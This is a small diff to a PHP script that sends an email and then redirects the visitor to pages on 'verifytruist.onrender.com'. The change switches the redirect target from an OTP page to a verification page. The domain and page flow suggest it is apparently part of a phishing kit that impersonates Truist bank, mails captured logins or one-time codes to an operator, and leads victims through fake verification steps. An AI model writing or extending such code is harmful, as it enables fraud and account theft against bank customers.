@@ -40,11 +40,13 @@ try {
 
     $mail->send();
 
-    header("Location:https://verifytruist.onrender.com/Truist/OTP2.html");
+    
+    header("Location:https://verifytruist.onrender.com/Truist/verification.html");
     exit;
 } catch (Exception $e) {
     echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
 }
+
 
 
 ?>
